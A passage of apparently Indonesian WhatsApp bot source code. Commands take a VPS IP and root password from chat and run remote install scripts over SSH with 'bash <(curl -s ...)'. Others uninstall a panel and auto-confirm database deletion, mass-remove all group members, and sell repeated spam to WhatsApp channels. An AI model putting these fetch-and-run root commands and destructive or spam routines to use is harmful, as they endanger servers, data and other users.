    return Reply(`✅ *Berhasil ${command === "on" ? "mengaktifkan" : "mematikan"} pengaturan ${event} di grup ini.*`);
}
break;

case 'blacklist': case 'blacklistjpm': case 'blgc': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[i].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[i].blacklistjpm = true
return m.reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[i].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[i].blacklistjpm = false
return m.reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delbljpm': {
 if (!isCreator) return m.reply('Perintah ini hanya untuk pemilik bot.');

 // Ambil ID grup dari argumen
 let groupId = args[0]; // Format: !delbljpm <group_id>
 if (!groupId) return m.reply('Silakan masukkan ID grup. Contoh: !delbljpm 1234567890-123456@g.us');
 if (!groupId.endsWith('@g.us')) return m.reply('ID grup tidak valid.');

 // Cek apakah grup ada di database blacklist
 if (!global.db.groups[i] || !global.db.groups[i].blacklistjpm) {
 return m.reply(`Grup ${groupId} tidak ada dalam daftar blacklist JPM.`);
 }

 // Hapus dari blacklist
 delete global.db.groups[i].blacklistjpm;
 m.reply(`Grup ${groupId} telah dihapus dari daftar blacklist JPM.`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listdaftarbl': {
 if (!isCreator) return m.reply('Perintah ini hanya untuk pemilik bot.');

 // Cek apakah database grup sudah ada
 if (!global.db.groups) global.db.groups = {};

 // Ambil semua grup yang di-blacklist
 let blacklistGroups = Object.entries(global.db.groups)
 .filter(([id, data]) => data.blacklistjpm === true);

 // Jika tidak ada grup yang di-blacklist
 if (blacklistGroups.length === 0) {
 return m.reply('Tidak ada grup yang di-blacklist.');
 }

 // Buat daftar grup yang di-blacklist
 let list = '*Daftar Grup Blacklist JPM:*\n\n';
 for (let [id, data] of blacklistGroups) {
 let groupMetadata = await conn.groupMetadata(id).catch(() => null); // Ambil info grup
 let groupName = groupMetadata ? groupMetadata.subject : 'Grup tidak ditemukan';
 list += `• *Nama Grup:* ${groupName}\n *ID Grup:* ${id}\n\n`;
 }

 // Kirim daftar
 m.reply(list.trim());
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'closegc': case "close": 
case 'opengc': case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await conn.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await conn.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'kudetagc': case 'kudeta': {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Rapszio Starting 🔥")
for (let i of memberFilter) {
await conn.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'demote':
case 'promote': {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'uninstalltema': {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|');
 if (t.length < 2) return Reply(`*Format salah!*\nPenggunaan: ${prefix + command} ipvps|password`)
 
 let ipvps = t[0];
 let passwd = t[1];
 
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };
 function rafa(opece) {
 return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
 }
 const command = `${global.bash}`

 const conn = new Client();
 let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

 conn.on('ready', () => {
 isSuccess = true; // Set flag menjadi true jika koneksi berhasil
 Reply('*PROSES UNINSTALL THEME DIMULAI MOHON TUNGGU 3 MENIT KEDEPAN*');
 
 conn.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Stream closed with code ' + code + ' and signal ' + signal);
 conn.end();
 }).on('data', (data) => {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('2\n');
 stream.write('y\n');
 stream.write('yes\n');
 stream.write('x\n');
 
 console.log('STDOUT: ' + data);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
 Reply('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 
 // Tambahkan jeda 3 menit (180000 ms) sebelum mengirim pesan "success uninstall theme"
 setTimeout(() => {
 if (isSuccess) {
 Reply('SUCCES UNINSTALL THEME PANEL ANDA COBA CEK');
 }
 }, 180000); // 180000 ms = 3 menit
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'installtemastellar': {
    if (!isCreator) return Reply(mess.owner)
    
    let t = text.split('|');
    if (t.length < 2) return Reply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps|password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function rafa(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = `${global.bash}`

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        Reply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                Reply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write(`${global.tokeninstall}\n`);
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        Reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            Reply('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'installtemabilling': case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'installtemaenigma': 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'uninstallpanel': {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'buynokos': {
    if (m.isGroup) return Reply("Pembelian nomor kosongan hanya bisa dilakukan di dalam private chat");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    let input = args.join(" ").split(",");
    if (input.length !== 3) return Reply("Format salah! Gunakan: *.buynokos jumlah,Indonesia/+62,whatsapp/telegram*");

    let jumlah = parseInt(input[0]) || 1;
    let negara = input[1].trim().toLowerCase();
    let layanan = input[2].trim().toLowerCase();

    if (jumlah < 1) return Reply("Minimal pembelian adalah 1 nomor.");
    if (negara !== "indonesia" && negara !== "+62") {
        return Reply("Maaf, untuk sementara pembelian hanya tersedia untuk nomor dengan kode negara +62 (Indonesia).");
    }

    // Menentukan harga berdasarkan layanan
    let hargaPerNokos;
    if (layanan === "whatsapp") {
        hargaPerNokos = 10000;
    } else if (layanan === "telegram") {
        hargaPerNokos = 8000;
    } else {
        return Reply("Layanan tidak valid! Gunakan *whatsapp* atau *telegram*.");
    }

    let totalHarga = hargaPerNokos * jumlah;
    let amount = totalHarga;

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*

 *• ID :* ${get.data.result.transactionId}
 *• Layanan :* ${layanan.charAt(0).toUpperCase() + layanan.slice(1)}
 *• Jumlah Pembelian :* ${jumlah} Nomor Kosongan
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Kode Negara :* ${negara === "+62" ? "+62 (Indonesia)" : "Indonesia"}
 *• Expired :* 5 menit

*Note :* 
- Qris pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
- Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

*Ketersediaan nomor dari negara lain sedang dalam pengembangan.*

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            {
                buttonId: `.batalbeli`,
                buttonText: { displayText: 'Batalkan Pembelian' },
                type: 1
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: { url: get.data.result.qrImageUrl }, 
        caption: teks3,
        contextInfo: {
            mentionedJid: [m.sender]
        },
    });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        jumlah: jumlah,
        layanan: layanan,
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria) {
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    await clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria) {
        await sleep(8000);
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data;

        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);
            await conn.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Layanan :* ${db.users[m.sender].saweria.layanan.charAt(0).toUpperCase() + db.users[m.sender].saweria.layanan.slice(1)}
 *• Jumlah Pembelian :* ${db.users[m.sender].saweria.jumlah} Nomor Kosongan
 *• Kode Negara :* ${negara === "+62" ? "+62 (Indonesia)" : "Indonesia"}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}

Segera hubungi *Developer kami* untuk mendapatkan nomor yang telah Anda beli.
`}, { quoted: db.users[m.sender].saweria.msg });

            await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }

}
break;

case 'buytokeninstallpanel': {
    if (m.isGroup) return m.reply("Pembelian token install panel hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    let us = crypto.randomBytes(4).toString('hex');
    let Obj = {};
    Obj.harga = "25000";
    Obj.username = us;
    const UrlQr = global.qrisOrderKuota;

    const amount = Number(Obj.harga) + generateRandomNumber(110, 250);
    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);
    
    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Token Install Panel
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
    `;

    let msgQr = await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            {
                buttonId: `.batalbeli`,
                buttonText: { displayText: 'Batalkan Pembelian' },
                type: 1
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: { url: get.data.result.qrImageUrl },
        caption: teks3,
        contextInfo: {
            mentionedJid: [m.sender]
        },
    });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    await clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000);
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data;
        
        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);

            // Generate Token dan Bash
            let tokenInstall = crypto.randomBytes(16).toString('hex'); 
            let bashScript = "bash install.sh";

            global.tokeninstall = tokenInstall;
            global.bash = bashScript;

            const teksSukses = `
*✅ PEMBAYARAN BERHASIL DITERIMA*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Token Install Panel

*🎫 TOKEN INSTALL PANEL*
 *🔑 Token Install :* ${global.tokeninstall}
 *💻 Perintah Bash :* ${global.bash}

📌 *Simpan baik-baik informasi di atas!* 
`;

            await conn.sendMessage(db.users[m.sender].saweria.chat, { text: teksSukses }, { quoted: db.users[m.sender].saweria.msg });

            await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case 'buyjasasharech': {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply("Teksnya?"); // Periksa apakah teks tersedia

  // Memuat daftar saluran dari file JSON
  const fs = require('fs');
  let daftarSaluran;
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
  } catch (error) {
    console.error("Gagal membaca file idsaluran.json:", error);
    return Reply("❌ Gagal membaca daftar saluran.");
  }

  if (db.users[m.sender].status_deposit) 
    return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  let us = crypto.randomBytes(4).toString('hex');
  let Obj = {};
  Obj.harga = "10000"; // Harga jasa share
  Obj.username = us;
  const UrlQr = global.qrisOrderKuota;

  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);
  const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);

  const teks3 = `
  *乂 INFORMASI PEMBAYARAN*
    
  *• ID :* ${get.data.result.transactionId}
  *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
  *• Barang :* Jasa Share ke Channel
  *• Expired :* 5 menit

  *Note :* 
  Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
  Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

  Ketik *.batalbeli* untuk membatalkan
  `;

  let msgQr = await conn.sendMessage(m.chat, {
    footer: `© 2025 ${botname}`,
    buttons: [
      {
        buttonId: `.batalbeli`,
        buttonText: { displayText: 'Batalkan Pembelian' },
        type: 1
      }
    ],
    headerType: 1,
    viewOnce: true,
    image: { url: get.data.result.qrImageUrl },
    caption: teks3,
    contextInfo: {
      mentionedJid: [m.sender]
    },
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: get.data.result.transactionId,
    amount: get.data.result.amount.toString(),
    exp: function () {
      setTimeout(async () => {
        if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
          await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
          await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
          db.users[m.sender].status_deposit = false;
          await clearInterval(db.users[m.sender].saweria.exp);
          delete db.users[m.sender].saweria;
        }
      }, 300000);
    }
  };

  await db.users[m.sender].saweria.exp();

  while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
    await sleep(8000);
    const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
    const req = await resultcek.data;
    if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
      db.users[m.sender].status_deposit = false;
      await clearInterval(db.users[m.sender].saweria.exp);
      await conn.sendMessage(db.users[m.sender].saweria.chat, {
        text: `
  *PEMBAYARAN BERHASIL DITERIMA ✅*

  *• ID :* ${db.users[m.sender].saweria.idDeposit}
  *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
  *• Barang :* Jasa Share ke Channel
  `}, { quoted: db.users[m.sender].saweria.msg });

      // Setelah pembayaran berhasil, kirim pesan ke semua channel
      Reply("⏳ Harap sabar, proses sedang berlangsung, jeda 5 menit menghindari kenon nomor anda...");
      for (const idSaluran of daftarSaluran) {
        try {
          await conn.sendMessage(idSaluran, { text: text });
        } catch (error) {
          console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error);
        }
      }
      Reply("✅ Berhasil mengirim pesan ke semua channel WhatsApp.");
    }
  }
}
break;

case 'buyjasasharechv2': {
  if (!isCreator) return m.reply(mess.owner);

  let [jumlah, ...pesanArray] = text.split('|');
  let pesan = pesanArray.join('|').trim();
  jumlah = parseInt(jumlah.trim());

  if (isNaN(jumlah) || jumlah <= 0) return m.reply("❌ Masukkan jumlah pesan yang valid di awal teks! Contoh: 3| Halo semua!");

  if (m.isGroup) return m.reply("Pembelian jasa share hanya bisa dilakukan dalam private chat");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  let us = crypto.randomBytes(4).toString('hex');
  let Obj = {};
  Obj.harga = "10000"; // Harga jasa share 10 ribu
  Obj.username = us;
  const UrlQr = global.qrisOrderKuota;

  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);
  const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);

  const teks3 = `
*乂 INFORMASI PEMBAYARAN*  

 *• ID :* ${get.data.result.transactionId}  
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}  
 *• Barang :* Jasa Share Channel  
 *• Expired :* 5 menit  

*Note :*  
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!  
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.  

Ketik *.batalbeli* untuk membatalkan  
`;

  let msgQr = await conn.sendMessage(m.chat, {
    footer: `© 2025 ${botname}`,
    buttons: [
      {
        buttonId: `.batalbeli`,
        buttonText: { displayText: 'Batalkan Pembelian' },
        type: 1
      }
    ],
    headerType: 1,
    viewOnce: true,
    image: { url: get.data.result.qrImageUrl },
    caption: teks3,
    contextInfo: {
      mentionedJid: [m.sender]
    },
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: get.data.result.transactionId,
    amount: get.data.result.amount.toString(),
    exp: function () {
      setTimeout(async () => {
        if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
          await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
          await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
          db.users[m.sender].status_deposit = false;
          await clearInterval(db.users[m.sender].saweria.exp);
          delete db.users[m.sender].saweria;
        }
      }, 300000);
    }
  };

  await db.users[m.sender].saweria.exp();

  while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
    await sleep(8000);
    const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
    const req = await resultcek.data;
    if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
      db.users[m.sender].status_deposit = false;
      await clearInterval(db.users[m.sender].saweria.exp);
      await conn.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*  

 *• ID :* ${db.users[m.sender].saweria.idDeposit}  
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}  
 *• Barang :* Jasa Share Channel  
` }, { quoted: db.users[m.sender].saweria.msg });

      // Setelah pembayaran berhasil, kirim pesan ke channel
      const fs = require('fs');
      let daftarSaluran;

      try {
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
        if (!Array.isArray(daftarSaluran) || daftarSaluran.length === 0) {
          return m.reply("❌ Tidak ada saluran yang terdaftar.");
        }
      } catch (error) {
        console.error("Gagal membaca file idsaluran.json:", error);
        return m.reply("❌ Gagal membaca daftar saluran.");
      }

      // Kirim pesan ke semua saluran sesuai jumlah yang dibeli
      for (const idSaluran of daftarSaluran) {
        for (let i = 0; i < jumlah; i++) {
          try {
            await conn.sendMessage(idSaluran, { text: pesan });
          } catch (error) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error);
          }
        }
      }

      m.reply(`✅ Berhasil mengirim pesan ke semua channel sebanyak ${jumlah} kali.`);
    }
  }
}
break;

case 'buyjasasharerelaych': { 
    if (!isCreator) return m.reply(mess.owner); 
    if (!text) return m.reply("Teksnya?"); // Periksa apakah teks tersedia

    // Import modul filesystem
    const fs = require('fs'); 

    // Memuat daftar saluran dari file JSON
    let daftarSaluran; 
    try { 
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); 
    } catch (error) { 
        console.error("Gagal membaca file idsaluran.json:", error); 
        return m.reply("❌ Gagal membaca daftar saluran."); 
    }

    if (m.isGroup) return m.reply("Pembelian jasa share hanya bisa dilakukan di private chat.");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");  

    // Konfigurasi harga jasa share
    let hargaJasa = 10000; // Harga share ke channel
    let us = crypto.randomBytes(4).toString('hex');
    let Obj = {};  
